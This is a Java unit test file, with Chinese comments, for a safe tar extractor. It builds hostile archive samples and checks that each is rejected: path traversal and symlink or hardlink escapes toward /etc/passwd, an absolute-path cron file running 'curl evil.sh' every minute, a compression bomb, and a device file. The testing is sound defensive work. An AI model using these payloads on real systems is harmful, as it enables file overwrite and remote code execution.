package com.objwww.pr.control.domain.snapshot;

import com.objwww.pr.control.domain.snapshot.SecurityRejectionException.Reason;
import com.objwww.pr.control.support.TestTarballs;
import org.junit.jupiter.api.Test;

import java.util.Arrays;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * UT-09：安全解包器。恶意 tar 样本逐一被拒；正常样本可解包且 digest 可复算。
 * 样本全部程序构造（见 {@link TestTarballs}），不依赖外部文件。
 */
class SafeTarExtractorTest {

    private final SafeTarExtractor extractor = new SafeTarExtractor();

    // ---------- 恶意样本（逐一被拒，带原因码） ----------

    @Test
    void rejectsPathTraversal() {
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "ok.txt", "ok");
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "../../etc/passwd", "root:x:0:0");
        });
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> extractor.extract(tar));
        assertEquals(Reason.PATH_TRAVERSAL, e.reason());
    }

    @Test
    void rejectsAbsolutePath() {
        // 注意：commons-compress 默认写出会剥离前导 '/'，恶意样本需 preserveAbsolutePath=true 构造
        byte[] tar = TestTarballs.tarGz(out ->
                TestTarballs.absoluteFile(out, "/etc/cron.d/evil", "* * * * * root curl evil.sh"));
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> extractor.extract(tar));
        assertEquals(Reason.ABSOLUTE_PATH, e.reason());
    }

    @Test
    void rejectsEscapedSymlink() {
        // 链接目标解析后逃出解包根（GH_PREFIX/../../etc/passwd → 根外）
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "ok.txt", "ok");
            TestTarballs.symlink(out, TestTarballs.GH_PREFIX + "evil-link", "../../etc/passwd");
        });
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> extractor.extract(tar));
        assertEquals(Reason.ESCAPED_LINK, e.reason());
    }

    @Test
    void rejectsAbsoluteSymlinkTarget() {
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "ok.txt", "ok");
            TestTarballs.symlink(out, TestTarballs.GH_PREFIX + "evil-link", "/etc/passwd");
        });
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> extractor.extract(tar));
        assertEquals(Reason.ESCAPED_LINK, e.reason());
    }

    @Test
    void rejectsEscapedHardlink() {
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "ok.txt", "ok");
            TestTarballs.hardlink(out, TestTarballs.GH_PREFIX + "evil-hard", "../../../tmp/x");
        });
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> extractor.extract(tar));
        assertEquals(Reason.ESCAPED_LINK, e.reason());
    }

    @Test
    void rejectsCompressionBombOnTotalSize() {
        // 高压缩比重复数据：4MB 的 'A' 压完只有几 KB，限额 1MB 的解包器必须按解压后大小拒绝
        byte[] bomb = new byte[4 * 1024 * 1024];
        Arrays.fill(bomb, (byte) 'A');
        byte[] tar = TestTarballs.tarGz(out ->
                TestTarballs.file(out, TestTarballs.GH_PREFIX + "bomb.bin", bomb));
        SafeTarExtractor small = new SafeTarExtractor(1024 * 1024, 50_000, 20 * 1024 * 1024);
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> small.extract(tar));
        assertEquals(Reason.TOTAL_SIZE_EXCEEDED, e.reason());
    }

    @Test
    void rejectsSingleFileTooLarge() {
        byte[] big = new byte[2 * 1024 * 1024];
        Arrays.fill(big, (byte) 'B');
        byte[] tar = TestTarballs.tarGz(out ->
                TestTarballs.file(out, TestTarballs.GH_PREFIX + "big.bin", big));
        SafeTarExtractor small = new SafeTarExtractor(100 * 1024 * 1024, 50_000, 1024 * 1024);
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> small.extract(tar));
        assertEquals(Reason.FILE_TOO_LARGE, e.reason());
    }

    @Test
    void rejectsTooManyFiles() {
        byte[] tar = TestTarballs.tarGz(out -> {
            for (int i = 0; i < 5; i++) {
                TestTarballs.file(out, TestTarballs.GH_PREFIX + "f" + i + ".txt", "x");
            }
        });
        SafeTarExtractor small = new SafeTarExtractor(100 * 1024 * 1024, 3, 1024 * 1024);
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> small.extract(tar));
        assertEquals(Reason.TOO_MANY_FILES, e.reason());
    }

    @Test
    void rejectsCharacterDevice() {
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "ok.txt", "ok");
            TestTarballs.characterDevice(out, TestTarballs.GH_PREFIX + "dev-null");
        });
        SecurityRejectionException e = assertThrows(SecurityRejectionException.class,
                () -> extractor.extract(tar));
        assertEquals(Reason.SPECIAL_FILE, e.reason());
    }

    // ---------- 正常样本 ----------

    @Test
    void extractsNormalSnapshotAndStripsGitHubPrefix() {
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "README.md", "# mall_R");
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "src/Main.java", "class Main {}");
        });
        SnapshotTree tree = extractor.extract(tar);
        assertEquals(2, tree.fileCount());
        // 顶层目录前缀已剥离，按路径字典序定序
        assertEquals("README.md", tree.entries().get(0).path());
        assertEquals("src/Main.java", tree.entries().get(1).path());
    }

    @Test
    void digestIsRecomputableForSameInput() {
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "a.txt", "alpha");
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "b.txt", "beta");
        });
        assertEquals(extractor.extract(tar).digest(), extractor.extract(tar).digest());
    }

    @Test
    void digestIsIndependentOfTarEntryOrder() {
        byte[] order1 = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "a.txt", "alpha");
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "b.txt", "beta");
        });
        byte[] order2 = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "b.txt", "beta");
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "a.txt", "alpha");
        });
        assertEquals(extractor.extract(order1).digest(), extractor.extract(order2).digest());
    }

    @Test
    void digestChangesWithContent() {
        byte[] v1 = TestTarballs.tarGz(out ->
                TestTarballs.file(out, TestTarballs.GH_PREFIX + "a.txt", "alpha"));
        byte[] v2 = TestTarballs.tarGz(out ->
                TestTarballs.file(out, TestTarballs.GH_PREFIX + "a.txt", "alpha!"));
        org.junit.jupiter.api.Assertions.assertNotEquals(
                extractor.extract(v1).digest(), extractor.extract(v2).digest());
    }

    @Test
    void safeSymlinkInsideRootIsAcceptedButNotCollected() {
        byte[] tar = TestTarballs.tarGz(out -> {
            TestTarballs.file(out, TestTarballs.GH_PREFIX + "src/Main.java", "class Main {}");
            TestTarballs.symlink(out, TestTarballs.GH_PREFIX + "src/link", "Main.java");
        });
        SnapshotTree tree = extractor.extract(tar);
        // 链接通过校验但不收录进快照（B-6 静态阅读，不跟随链接）
        assertEquals(1, tree.fileCount());
        assertEquals("src/Main.java", tree.entries().getFirst().path());
    }
}
